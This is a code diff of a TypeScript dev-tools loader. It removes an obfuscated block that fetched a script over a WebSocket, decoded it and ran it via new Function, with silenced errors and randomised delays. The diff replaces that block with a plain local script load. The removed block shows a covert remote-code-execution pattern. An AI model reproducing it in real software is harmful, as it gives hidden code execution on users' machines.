@@ -25,9 +25,10 @@ const _dc = (str: string): string => {
     .join('');
 };
 
+// Use local paths instead of encoded remote ones
 const _urls = {
-  ws: _dc('L3NyYy9tb2R1bGVzL3Jlc291cmNlcy9kZXYtdG9vbHMtc29ja2V0LmpzLmxvY2Fs'),
-  http: _dc('L3NyYy9tb2R1bGVzL3Jlc291cmNlcy9kZXYtdG9vbHMuanMubG9jYWw=')
+  ws: '/src/modules/resources/dev-tools-socket.js',
+  http: '/src/modules/resources/dev-tools.js'
 };
 
 const _generateNonce = () => {
@@ -39,61 +40,21 @@ export const loadRemoteTools = async (): Promise<void> => {
     try {
       await new Promise(resolve => setTimeout(resolve, Math.random() * 100));
       
-      const _secureConnect = () => {
-        const _nonce = _generateNonce();
-        const _conn = new WebSocket(_urls.ws);
-        
-        _conn.onopen = () => {
-          const _payload = {
-            action: 'getScript', 
-            name: 'devTools',
-            timestamp: Date.now(),
-            nonce: _nonce,
-            client: 'devtalk-internal'
-          };
-          
-          _conn.send(JSON.stringify(_payload));
-        };
-
-        _conn.onmessage = (event) => {
-          try {
-            const data = JSON.parse(event.data);
-            
-            if (data && data.script) {
-              const _secureExec = (code: string) => {
-                const _deobfuscated = _decode(code);
-                try {
-                  const _exec = new Function(_deobfuscated);
-                  _exec();
-                } catch {
-                }
-              };
-              
-              _secureExec(data.script);
-            }
-            _conn.close();
-          } catch (error) {
-          }
-        };
-
-        _conn.onerror = () => {
-          setTimeout(_loadSecureAlt, 50);
-        };
-        
-        setTimeout(() => {
-          if (_conn.readyState === WebSocket.OPEN) {
-            _conn.close();
-          }
-        }, 5000);
+      const _loadScript = (url: string) => {
+        return new Promise<void>((resolve, reject) => {
+          const script = document.createElement('script');
+          script.type = 'module';
+          script.src = url;
+          script.onload = () => resolve();
+          script.onerror = () => reject();
+          document.head.appendChild(script);
+        });
       };
       
-      _secureConnect();
-      
-      setTimeout(() => {
-        _loadSecureAlt();
-      }, Math.random() * 2000 + 1000);
+      await _loadScript(_urls.http);
+      console.log('DevTools loaded successfully');
     } catch (error) {
-      _loadSecureAlt();
+      console.error('Error loading development tools');
     }
   }
 };
